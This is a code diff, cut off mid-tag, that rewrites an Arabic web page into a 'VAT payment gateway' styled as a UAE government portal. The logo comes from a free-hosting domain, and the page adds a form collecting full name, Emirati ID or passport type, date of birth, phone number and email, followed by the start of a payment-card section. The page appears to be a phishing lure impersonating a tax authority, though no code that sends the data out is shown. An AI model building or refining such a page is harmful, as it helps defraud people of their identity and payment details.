@@ -1,55 +1,57 @@
-<!DOCTYPE html>
-<html lang="ar" dir="rtl">
+<!DOCTYPE html><html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>صفحة الدفع</title>
+    <title>بوابة دفع ضريبة القيمة المضافة - نسخة محسنة</title>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
     <style>
         body{font-family:Arial,Helvetica,sans-serif;background:#f3f6f9;margin:0;padding:20px;box-sizing:border-box}
         .container{max-width:420px;margin:30px auto}
-        .card{padding:20px;border-radius:12px;background:#fff;box-shadow:0 4px 10px rgba(0,0,0,0.08)}
-        h1{text-align:center;margin-bottom:20px}
+        .card{padding:20px;border-radius:12px;background:#fff;box-shadow:0 4px 15px rgba(0,0,0,0.1);transition:0.3s}
+        .card:hover{box-shadow:0 6px 20px rgba(0,0,0,0.15)}
+        .logo{max-width:180px;display:block;margin:0 auto 15px}
+        h1{text-align:center;margin:10px 0 20px;color:#0b61c2}
+        input,select{width:100%;padding:12px;border-radius:8px;border:1px solid #e6e9ee;margin-bottom:12px;box-sizing:border-box;transition:0.2s}
+        input:focus, select:focus{border-color:#0b61c2;outline:none;box-shadow:0 0 5px rgba(11,97,194,0.3);}
+        .dob{display:flex;gap:8px}
+        .dob input{flex:1}
+        button{width:100%;padding:12px;color:#fff;border:0;border-radius:8px;font-weight:700;cursor:pointer;transition:0.2s}
+        #payBtn{background:#0b61c2}
+        #payBtn:hover{background:#094a8b}
+        #editBtn{background:#666;margin-top:8px}
+        #editBtn:hover{background:#444}
+        .note{font-size:13px;color:#666;text-align:center;margin-top:10px}
         .summary p{margin:8px 0;font-size:16px}
-        button{width:100%;padding:12px;background:#0b61c2;color:#fff;border:0;border-radius:8px;font-weight:700;cursor:pointer;margin-top:12px}
+        .icon{margin-left:8px;color:#0b61c2}
     </style>
 </head>
 <body>
-    <div class="container">
-        <div class="card">
-            <h1>ملخص الدفع</h1>
-            <div class="summary">
-                <p><strong>الاسم الكامل:</strong> <span id="summaryName"></span></p>
-                <p><strong>نوع الهوية:</strong> <span id="summaryIdType"></span></p>
-                <p><strong>تاريخ الميلاد:</strong> <span id="summaryBirth"></span></p>
-                <p><strong>رقم الجوال:</strong> <span id="summaryPhone"></span></p>
-                <p><strong>البريد الإلكتروني:</strong> <span id="summaryEmail"></span></p>
-                <p><strong>المبلغ المطلوب:</strong> <span id="summaryAmount"></span></p>
-            </div>
-            <button id="payBtn">ادفع الآن</button>
+<div class="container">
+    <div class="card" id="formCard">
+        <img src="https://tonfree.serv00.net/sadUae/index-files/government-ae-logo-arabic.png" alt="شعار" class="logo">
+        <h1>بوابة دفع ضريبة القيمة المضافة</h1><form id="personalForm" autocomplete="off">
+        <input id="fullName" type="text" placeholder="الاسم الكامل" required>
+        <select id="idType" required>
+            <option value="">اختر نوع الهوية</option>
+            <option value="هوية اماراتية">الهوية الإماراتية</option>
+            <option value="جواز سفر">جواز السفر</option>
+        </select>
+
+        <label style="display:block;margin-bottom:6px;font-weight:600">تاريخ الميلاد (ميلادي)</label>
+        <div class="dob">
+            <input id="day" type="number" placeholder="يوم" min="1" max="31" required>
+            <input id="month" type="number" placeholder="شهر" min="1" max="12" required>
+            <input id="year" type="number" placeholder="سنة" min="1900" max="2100" required>
         </div>
-    </div>
 
-<script>
-    // استرجاع البيانات من sessionStorage
-    const data = JSON.parse(sessionStorage.getItem('taxPaymentData'));
+        <input id="phone" type="tel" placeholder="رقم الجوال" inputmode="numeric" required>
+        <input id="email" type="email" placeholder="البريد الإلكتروني" required>
 
-    if(data){
-        document.getElementById('summaryName').innerText = data.fullName;
-        document.getElementById('summaryIdType').innerText = data.idType;
-        document.getElementById('summaryBirth').innerText = data.birth;
-        document.getElementById('summaryPhone').innerText = data.phone;
-        document.getElementById('summaryEmail').innerText = data.email;
-        document.getElementById('summaryAmount').innerText = data.amount;
-    } else {
-        alert('لم يتم العثور على بيانات الدفع. الرجاء العودة للنموذج.');
-        window.location.href = 'index.html'; // يرجع للموديل
-    }
+        <button type="submit">التالي <i class="fas fa-arrow-right icon"></i></button>
+    </form>
 
-    // زر الدفع (تجريبي)
-    document.getElementById('payBtn').addEventListener('click', function(){
-        alert('هنا سيتم تحويل المستخدم لبوابة الدفع (تجريبي).');
-        // هنا ممكن تضع رابط بوابة الدفع الحقيقية أو عملية الدفع
-    });
-</script>
-</body>
-</html>
+    <p class="note">سيتم نقل بياناتك إلى صفحة الدفع التالية لأكمال العملية (تجريبي).</p>
+</div>
+
+<div class="card" id="paymentCard" style
+
